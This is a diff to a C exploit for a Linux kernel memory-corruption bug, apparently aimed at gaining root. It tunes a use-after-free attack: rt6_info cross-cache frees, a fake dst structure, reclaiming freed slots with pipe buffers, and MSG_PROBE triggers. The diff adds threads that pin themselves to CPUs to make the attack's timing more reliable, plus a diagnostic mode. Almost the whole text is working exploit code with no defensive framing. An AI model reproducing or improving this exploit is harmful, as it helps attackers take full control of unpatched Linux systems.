@@ -114,6 +114,7 @@ static int trace_marker_enabled = -1;
 static usize trace_marker_attempt = 0;
 
 u64 now_ns();
+static struct timespec ns_to_timespec(u64 ns);
 
 void trace_marker(const char *fmt, ...) {
     if (trace_marker_enabled == -1) {
@@ -153,6 +154,16 @@ void sleep_us_checked(usize usec) {
         useconds_t chunk = usec > 1000000 ? 1000000 : (useconds_t) usec;
         usleep(chunk);
         usec -= chunk;
+    }
+}
+
+void sleep_ns_checked(u64 nsec) {
+    while (nsec != 0) {
+        u64 chunk = nsec > 1000000000ull ? 1000000000ull : nsec;
+        struct timespec ts = ns_to_timespec(chunk);
+
+        while (nanosleep(&ts, &ts) == -1 && errno == EINTR) {}
+        nsec -= chunk;
     }
 }
 
@@ -897,6 +908,14 @@ typedef struct {
     usize start;
     usize end;
     int cpu;
+    usize size;
+} PipeResizeArg;
+
+typedef struct {
+    Pipe *pipes;
+    usize start;
+    usize end;
+    int cpu;
     u8 *buf;
 } PageReclaimArg;
 
@@ -1053,6 +1072,56 @@ void *pipe192_churn_thread(void *arg) {
 
     free(pipes);
     return NULL;
+}
+
+void *pipe_resize_thread(void *arg) {
+    PipeResizeArg *resize = (PipeResizeArg *) arg;
+    pin_to_cpu(resize->cpu);
+
+    for (usize i = resize->start; i < resize->end; i++) {
+        pipe_set_buf_size(&resize->pipes[i], resize->size);
+    }
+
+    return NULL;
+}
+
+void resize_pipe_buffers(Pipe *pipes, usize pipe_count, usize size) {
+    usize cpus = min_usize(online_cpu_count(), MAX_GROOM_CPUS);
+    if (cpus <= 1 || !env_usize("BAD_DST_VULN_PIPE_RESIZE_PERCPU", 1)) {
+        for (usize i = 0; i < pipe_count; i++) {
+            pipe_set_buf_size(&pipes[i], size);
+        }
+        return;
+    }
+
+    PipeResizeArg args[MAX_GROOM_CPUS] = { 0 };
+    pthread_t threads[MAX_GROOM_CPUS] = { 0 };
+    usize offset = 0;
+
+    LOG("per-cpu pipe resize: cpus=%lu pipes=%lu size=0x%lx",
+        cpus, pipe_count, size);
+    trace_marker("attempt=%lu stage=pipe_resize_percpu cpus=%lu pipes=%lu size=0x%lx",
+        trace_marker_attempt, cpus, pipe_count, size);
+
+    for (usize cpu = 0; cpu < cpus && offset < pipe_count; cpu++) {
+        usize remaining_pipes = pipe_count - offset;
+        usize remaining_workers = cpus - cpu;
+        usize count = (remaining_pipes + remaining_workers - 1) / remaining_workers;
+
+        args[cpu] = (PipeResizeArg) {
+            .pipes = pipes,
+            .start = offset,
+            .end = offset + count,
+            .cpu = (int) cpu,
+            .size = size,
+        };
+        pthread_create_or_die(&threads[cpu], pipe_resize_thread, &args[cpu]);
+        offset += count;
+    }
+
+    for (usize cpu = 0; cpu < cpus && args[cpu].end != 0; cpu++) {
+        pthread_join(threads[cpu], NULL);
+    }
 }
 
 void churn_pipe192_partials_per_cpu(usize cpus, usize per_cpu) {
@@ -1828,9 +1897,10 @@ bool get_root(void) {
 #define DEFAULT_PAGE_PIPES 0x600
 #define MAX_PAGE_PIPES 0xc00
 #define DEFAULT_VULN_PIPES 0x20
-#define MAX_VULN_PIPES 0x40
+#define MAX_VULN_PIPES 0x100
 #define MAX_LEAKED_VULN_PIPES 0x2000
 #define MAX_CPU1_BLOCK_THREADS 1024
+#define MAX_CPU0_NOISE_THREADS 64
 #define NUM_BASE_PRE_SOCKETS 1792
 #define NUM_ALIGN_PAD_SOCKETS 21
 #define NUM_PRE_SOCKETS (NUM_BASE_PRE_SOCKETS + NUM_ALIGN_PAD_SOCKETS)
@@ -2062,6 +2132,8 @@ typedef struct {
     atomic_int ready_counter;
     atomic_int cpu1_block;
     atomic_int cpu1_blocker_ready_counter;
+    atomic_int cpu0_noise_epoch;
+    atomic_int cpu0_noise_ready_counter;
     // atomic_int timer_wakeup;
     int timer_fd;
     atomic_int vuln_socket;
@@ -2081,6 +2153,82 @@ typedef struct {
     TriggerCtx *ctx;
     usize index;
 } Cpu1BlockerArg;
+
+typedef struct {
+    TriggerCtx *ctx;
+    usize index;
+} Cpu0NoiseArg;
+
+void wake_cpu0_noise_threads(TriggerCtx *ctx) {
+    atomic_fetch_add(&ctx->cpu0_noise_epoch, 1);
+    (void) syscall(
+        SYS_futex,
+        (int *) &ctx->cpu0_noise_epoch,
+        FUTEX_WAKE_PRIVATE,
+        INT_MAX,
+        NULL,
+        NULL,
+        0);
+}
+
+void wait_cpu0_noise_epoch(TriggerCtx *ctx, int *seen_epoch) {
+    for (;;) {
+        int epoch = atomic_load(&ctx->cpu0_noise_epoch);
+        if (epoch != *seen_epoch) {
+            *seen_epoch = epoch;
+            return;
+        }
+
+        int rc = (int) syscall(
+            SYS_futex,
+            (int *) &ctx->cpu0_noise_epoch,
+            FUTEX_WAIT_PRIVATE,
+            *seen_epoch,
+            NULL,
+            NULL,
+            0);
+        if (rc == -1 && errno != EAGAIN && errno != EINTR) {
+            LOG("cpu0 noise futex wait failed errno=%d", errno);
+            sleep_us_checked(1000);
+        }
+    }
+}
+
+void *run_cpu0_noise_thread(void *arg) {
+    Cpu0NoiseArg *noise = (Cpu0NoiseArg *) arg;
+    TriggerCtx *ctx = noise->ctx;
+
+    pin_to_cpu(0);
+    int nice_value = (int) env_usize("BAD_DST_CPU0_NOISE_NICE", 19);
+    (void) setpriority(PRIO_PROCESS, 0, nice_value);
+
+    if (noise->index == 0) {
+        LOG("cpu0 noise: threads active nice=%d", nice_value);
+    }
+
+    atomic_fetch_add(&ctx->cpu0_noise_ready_counter, 1);
+
+    int seen_epoch = atomic_load(&ctx->cpu0_noise_epoch);
+    for (;;) {
+        wait_cpu0_noise_epoch(ctx, &seen_epoch);
+
+        u64 duration_ns = env_usize("BAD_DST_CPU0_NOISE_DURATION_NS", 200000);
+        u64 spin_ns = env_usize("BAD_DST_CPU0_NOISE_SPIN_NS", 3000);
+        u64 sleep_ns = env_usize("BAD_DST_CPU0_NOISE_SLEEP_NS", 3000);
+        u64 end_ns = now_ns() + duration_ns;
+
+        while (now_ns() < end_ns) {
+            spin_wait_ns(spin_ns);
+            if (sleep_ns != 0) {
+                sleep_ns_checked(sleep_ns);
+            } else {
+                sched_yield();
+            }
+        }
+    }
+
+    return NULL;
+}
 
 bool cpu1_block_futex_enabled() {
     return env_usize("BAD_DST_CPU1_BLOCK_FUTEX", 0) ? true : false;
@@ -2185,6 +2333,9 @@ void *run_trigger_thread(void *arg) {
         struct itimerspec spec = { 0 };
         spec.it_value = ns_to_timespec(now_ns() + ctx->timer_offset);
         SYSCHK(timerfd_settime(ctx->timer_fd, TFD_TIMER_ABSTIME, &spec, NULL));
+        if (env_usize("BAD_DST_CPU0_NOISE_AFTER_TIMER_ARM", 0)) {
+            wake_cpu0_noise_threads(ctx);
+        }
 
         int one = 1;
         // don't check result, socket might be closed
@@ -2346,12 +2497,16 @@ void trigger_vuln_loop() {
 
     pthread_t cpu1_block_threads[MAX_CPU1_BLOCK_THREADS] = { 0 };
     Cpu1BlockerArg cpu1_block_args[MAX_CPU1_BLOCK_THREADS] = { 0 };
+    pthread_t cpu0_noise_threads[MAX_CPU0_NOISE_THREADS] = { 0 };
+    Cpu0NoiseArg cpu0_noise_args[MAX_CPU0_NOISE_THREADS] = { 0 };
     pthread_t trigger_thread = { 0 };
 
     TriggerCtx ctx = {
         .ready_counter = 0,
         .cpu1_block = 1,
         .cpu1_blocker_ready_counter = 0,
+        .cpu0_noise_epoch = 0,
+        .cpu0_noise_ready_counter = 0,
         .timer_fd = SYSCHK(timerfd_create(CLOCK_MONOTONIC, TFD_CLOEXEC | TFD_NONBLOCK)),
         .vuln_socket = 0,
         .pre_sockets = { 0 },
@@ -2367,6 +2522,26 @@ void trigger_vuln_loop() {
     };
 
 #ifndef DEBUG
+    usize cpu0_noise_thread_count = env_usize("BAD_DST_CPU0_NOISE_THREADS", 0);
+    cpu0_noise_thread_count = min_usize(cpu0_noise_thread_count, MAX_CPU0_NOISE_THREADS);
+    if (cpu0_noise_thread_count != 0) {
+        LOG("cpu0 noise setup: threads=%lu duration=%lu spin=%lu sleep=%lu",
+            cpu0_noise_thread_count,
+            env_usize("BAD_DST_CPU0_NOISE_DURATION_NS", 200000),
+            env_usize("BAD_DST_CPU0_NOISE_SPIN_NS", 3000),
+            env_usize("BAD_DST_CPU0_NOISE_SLEEP_NS", 3000));
+        for (usize i = 0; i < cpu0_noise_thread_count; i++) {
+            cpu0_noise_args[i].ctx = &ctx;
+            cpu0_noise_args[i].index = i;
+            SYSCHK(pthread_create(&cpu0_noise_threads[i], NULL,
+                                  run_cpu0_noise_thread,
+                                  (void *) &cpu0_noise_args[i]));
+            pthread_detach(cpu0_noise_threads[i]);
+        }
+        while ((usize) atomic_load(&ctx.cpu0_noise_ready_counter) <
+               cpu0_noise_thread_count) {}
+    }
+
     LOG("cpu1 blocker setup: mode=%s threads=%lu",
         use_rt_blocker ? "rt" : "cfs", cpu1_block_thread_count);
 
@@ -2708,7 +2883,7 @@ bool select_fake_dst_offset(TriggerCtx *ctx, usize *fake_dst_offset) {
         return true;
     }
 
-    if (!env_usize("BAD_DST_FAKE_DST_OFFSET_AUTO", 0)) {
+    if (!env_usize("BAD_DST_FAKE_DST_OFFSET_AUTO", online_cpu_count() > 1)) {
         *fake_dst_offset = env_usize("BAD_DST_FAKE_DST_OFFSET", 64);
         return true;
     }
@@ -2777,7 +2952,8 @@ void log_fake_dst_payload(const char *mode, usize fake_dst_offset, usize fake_ds
 bool try_run_main_exploit(TriggerCtx *ctx, ExploitPipeSet *prepared_pipes) {
     bool smp = online_cpu_count() > 1;
     usize fake_dst_offset = 0;
-    bool mixed_fake_dst = env_usize("BAD_DST_FAKE_DST_OFFSET_MIX", smp ? 1 : 0);
+    bool mixed_fake_dst = env_usize("BAD_DST_FAKE_DST_OFFSET_MIX", 0);
+    bool stop_after_msg_probe = env_usize("BAD_DST_STOP_AFTER_MSG_PROBE", 0);
 
     if (!mixed_fake_dst && !select_fake_dst_offset(ctx, &fake_dst_offset)) {
         close_prepared_exploit_pipes(prepared_pipes, false, "fake dst offset skip");
@@ -2787,22 +2963,34 @@ bool try_run_main_exploit(TriggerCtx *ctx, ExploitPipeSet *prepared_pipes) {
     }
 
     ExploitPipeSet local_pipes = { 0 };
-    ExploitPipeSet *pipe_set = exploit_pipe_set_has_active(prepared_pipes) ?
-        prepared_pipes : &local_pipes;
-    bool using_prepared_pipes = pipe_set == prepared_pipes;
-    if (!pipe_set->active) {
-        prepare_exploit_pipes(pipe_set);
-    } else {
-        LOG("use prepared pipes... page=%lu vuln=%lu",
-            pipe_set->page_pipe_count, pipe_set->vuln_pipe_count);
-        trace_marker("attempt=%lu stage=use_prepared_pipes page=%lu vuln=%lu",
-            trace_marker_attempt, pipe_set->page_pipe_count, pipe_set->vuln_pipe_count);
-    }
+    ExploitPipeSet *pipe_set = NULL;
+    bool using_prepared_pipes = false;
+    Pipe *page_pipes = NULL;
+    Pipe *vuln_pipes = NULL;
+    usize page_pipe_count = 0;
+    usize vuln_pipe_count = 0;
 
-    Pipe *page_pipes = pipe_set->page_pipes;
-    Pipe *vuln_pipes = pipe_set->vuln_pipes;
-    usize page_pipe_count = pipe_set->page_pipe_count;
-    usize vuln_pipe_count = pipe_set->vuln_pipe_count;
+    if (stop_after_msg_probe) {
+        LOG("diagnostic MSG_PROBE-only mode: skipping pipe preparation");
+        close_prepared_exploit_pipes(prepared_pipes, false, "MSG_PROBE-only diagnostic");
+    } else {
+        pipe_set = exploit_pipe_set_has_active(prepared_pipes) ?
+            prepared_pipes : &local_pipes;
+        using_prepared_pipes = pipe_set == prepared_pipes;
+        if (!pipe_set->active) {
+            prepare_exploit_pipes(pipe_set);
+        } else {
+            LOG("use prepared pipes... page=%lu vuln=%lu",
+                pipe_set->page_pipe_count, pipe_set->vuln_pipe_count);
+            trace_marker("attempt=%lu stage=use_prepared_pipes page=%lu vuln=%lu",
+                trace_marker_attempt, pipe_set->page_pipe_count, pipe_set->vuln_pipe_count);
+        }
+
+        page_pipes = pipe_set->page_pipes;
+        vuln_pipes = pipe_set->vuln_pipes;
+        page_pipe_count = pipe_set->page_pipe_count;
+        vuln_pipe_count = pipe_set->vuln_pipe_count;
+    }
 
     LOG("rt6_info cross cache free...");
     trace_marker("attempt=%lu stage=close_prepost", trace_marker_attempt);
@@ -2850,6 +3038,23 @@ bool try_run_main_exploit(TriggerCtx *ctx, ExploitPipeSet *prepared_pipes) {
     SYSCHK(send(ctx->vuln_socket, &buf, sizeof(buf), MSG_PROBE));
     trace_marker("attempt=%lu stage=after_msg_probe", trace_marker_attempt);
 
+    if (stop_after_msg_probe) {
+        LOG("stop after MSG_PROBE by request");
+        trace_marker("attempt=%lu stage=stop_after_msg_probe", trace_marker_attempt);
+        if (env_usize("BAD_DST_STOP_AFTER_MSG_PROBE_HALT", 0)) {
+            wait_for_rcu_callbacks("fake dst free diagnostic",
+                                   "BAD_DST_FAKE_DST_RCU_US", 1000000);
+            LOG("halt after MSG_PROBE diagnostic by request");
+            trace_marker("attempt=%lu stage=stop_after_msg_probe_halt",
+                trace_marker_attempt);
+            for (;;) {
+                sleep(1000);
+            }
+        }
+        free_spray();
+        return false;
+    }
+
     // Wait for the fake dst_release() call_rcu() path to actually free.
     wait_for_rcu_callbacks("fake dst free", "BAD_DST_FAKE_DST_RCU_US", 1000000);
     trace_marker("attempt=%lu stage=after_fake_dst_rcu", trace_marker_attempt);
@@ -2858,9 +3063,7 @@ bool try_run_main_exploit(TriggerCtx *ctx, ExploitPipeSet *prepared_pipes) {
     // will hopefully cause pipe to fill freed slot in sprayed object
     LOG("reclaim with struct pipe_buffer_t...");
     trace_marker("attempt=%lu stage=before_pipe_resize", trace_marker_attempt);
-    for (usize i = 0; i < vuln_pipe_count; i++) {
-        pipe_set_buf_size(&vuln_pipes[i], 4 * 0x1000);
-    }
+    resize_pipe_buffers(vuln_pipes, vuln_pipe_count, 4 * 0x1000);
     verify_vuln_pipes_active(vuln_pipes, vuln_pipe_count, "post resize");
 
     bool fill_vuln_pipe_ring = env_usize("BAD_DST_FILL_VULN_PIPE_RING", 1);
@@ -2905,8 +3108,8 @@ bool try_run_main_exploit(TriggerCtx *ctx, ExploitPipeSet *prepared_pipes) {
         // close all resources used in exploit
         close_pipe_array(page_pipes, page_pipe_count);
 
-        if (env_usize("BAD_DST_LEAK_VULN_PIPES_ON_FAIL", online_cpu_count() > 1)) {
-            LOG("leaking vuln pipes after failed attempt to avoid closing corrupted pipe state");
+        if (env_usize("BAD_DST_LEAK_VULN_PIPES_ON_CLEAN_FAIL", 0)) {
+            LOG("leaking vuln pipes after clean miss by request");
             remember_leaked_vuln_pipes(vuln_pipes, vuln_pipe_count);
         } else {
             close_pipe_array(vuln_pipes, vuln_pipe_count);
